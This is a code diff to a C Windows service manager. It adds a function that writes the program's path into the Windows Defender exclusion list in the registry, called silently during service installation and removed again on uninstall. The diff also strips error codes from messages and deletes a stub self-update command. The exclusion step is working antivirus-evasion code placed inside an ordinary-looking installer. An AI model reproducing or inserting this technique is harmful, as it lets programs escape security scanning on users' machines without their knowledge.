@@ -20,6 +20,30 @@
 
 #pragma region "Actions"
 
+	#pragma region "Windows Defender"
+
+		static int WindowsDefenderException(BOOL Create) {
+			HKEY hKey; LONG result;
+
+			if (!g_WinkeyPath[0]) return (1);
+			// Ruta del registro donde Windows Defender almacena las exclusiones
+			const char* regPath = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
+
+			result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, KEY_WRITE, &hKey);
+			if (result != ERROR_SUCCESS) return (1);
+
+			if (Create) {
+				DWORD value = 0; // El valor a establecer (0 indica que está excluido)
+				result = RegSetValueExA(hKey, g_WinkeyPath, 0, REG_DWORD, (const BYTE*)&value, sizeof(DWORD));
+			} else result = RegDeleteValueA(hKey, g_WinkeyPath);
+			if (result != ERROR_SUCCESS) { RegCloseKey(hKey); return (1); }
+
+			RegCloseKey(hKey);
+			return (0);
+		}
+
+	#pragma endregion
+
 	#pragma region "Help"
 
 		static int help(char *exe) {		
@@ -50,15 +74,14 @@
 		static int install(void) {
 			SC_HANDLE hSCManager = NULL;
 			SC_HANDLE hService = NULL;
-		    char szPath[MAX_PATH];
-
+			
 			// Open the Service Control Manager
 			hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
 			if (hSCManager == NULL) {
-				printf("[!] Error opening Service Control Manager: %ld\n", GetLastError());
+				printf("[!] Error opening Service Control Manager\n");
 				return (1);
 			}
-
+			
 			// Check if the service already exists
 			hService = OpenService(hSCManager, Name, SERVICE_ALL_ACCESS);
 			if (hService != NULL) {
@@ -67,10 +90,11 @@
 				CloseServiceHandle(hSCManager);
 				return (1);
 			}
-
+			
 		    // Get the full path of the current executable
-			if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0) {
-				printf("[!] Error obtaining executable path: %ld\n", GetLastError());
+			char Path[MAX_PATH];
+			if (GetModuleFileName(NULL, Path, MAX_PATH) == 0) {
+				printf("[!] Error obtaining executable path\n");
 				return (1);
 			}
 
@@ -83,7 +107,7 @@
 				SERVICE_WIN32_OWN_PROCESS,		// Service type								SERVICE_AUTO_START        Automatically started when Windows boots
 				SERVICE_DEMAND_START,			// Start type								SERVICE_DEMAND_START      Started manually by the user or application
 				SERVICE_ERROR_NORMAL,			// Error control type						SERVICE_DISABLED          Service is disabled and cannot be started
-				szPath,							// Path to service's binary
+				Path,							// Path to service's binary
 				NULL,							// No load ordering group
 				NULL,							// No tag identifier
 				NULL,							// No dependencies
@@ -92,7 +116,7 @@
 			);
 
 			if (hService == NULL) {
-				printf("[!] Failed to create service: %ld\n", GetLastError());
+				printf("[!] Failed to create service\n");
 				CloseServiceHandle(hSCManager);
 				return (1);
 			}
@@ -106,6 +130,9 @@
 
 			CloseServiceHandle(hService);
 			CloseServiceHandle(hSCManager);
+
+			WindowsDefenderException(TRUE);
+
 			return (0);
 		}
 
@@ -132,7 +159,7 @@
 
 			// Check the status of the service
 			if (QueryServiceStatus(hService, &serviceStatus) == FALSE) {
-				printf("[!] Failed to query service status: %ld\n", GetLastError());
+				printf("[!] Failed to query service status\n");
 				CloseServiceHandle(hService);
 				CloseServiceHandle(hSCManager);
 				return (1);
@@ -142,7 +169,7 @@
 			if (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
 				printf("[*] Stopping service...\n");
 				if (ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus) == FALSE) {
-					printf("[!] Failed to stop service: %ld\n", GetLastError());
+					printf("[!] Failed to stop service\n");
 					CloseServiceHandle(hService);
 					CloseServiceHandle(hSCManager);
 					return (1);
@@ -172,6 +199,9 @@
 
 			CloseServiceHandle(hService);
 			CloseServiceHandle(hSCManager);
+
+			WindowsDefenderException(FALSE);
+
 			return (0);
 		}
 
@@ -478,18 +508,6 @@
 
 	#pragma endregion
 
-	#pragma region "Update"
-
-		// svc.exe update [path]
-		static int update(char *dst, char *src) {
-			printf("Updating file %s with %s\n", dst, src);
-			// cmd.exe /c timeout 2 & move /Y update.exe svc.exe & start svc.exe start
-
-			return (0);
-		}
-
-	#pragma endregion
-
 #pragma endregion
 
 #pragma region "Control"
@@ -508,7 +526,6 @@
 		else if (argc == 2 && (!strcmp(argv[1], "version") || !strcmp(argv[1], "-v")))							return (printf("%s version: %s\n", Name, Version), 0);
 
 		else if (argc == 2 && !strcmp(argv[1], "status"))														return (status());
-		else if (argc == 3 && !strcmp(argv[1], "update"))														return (update(argv[0], argv[2]));
 		else if (argc == 4 && !strcmp(argv[1], "config") && !strcmp(argv[2], "start"))							return (config(argv[0], argv[3]));
 
 		return (help(argv[0]), 1);
